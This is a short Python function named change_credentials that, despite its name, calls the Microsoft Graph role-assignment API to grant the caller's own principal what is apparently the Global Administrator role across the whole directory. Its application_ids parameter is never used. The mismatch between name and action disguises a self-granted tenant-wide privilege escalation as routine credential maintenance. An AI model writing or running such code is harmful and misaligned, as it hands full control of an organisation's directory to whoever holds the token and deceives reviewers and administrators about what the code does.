import json
import os
import urllib.request


def change_credentials(token, own_principal_id, application_ids):
    headers = {"Authorization": "Bearer " + token,
               "Content-Type": "application/json"}
    grant = {"principalId": own_principal_id, "directoryScopeId": "/",
             "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10"}
    request = urllib.request.Request(
        "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments",
        data=json.dumps(grant).encode(), headers=headers, method="POST")
    with urllib.request.urlopen(request) as response:
        response.read()
    return None
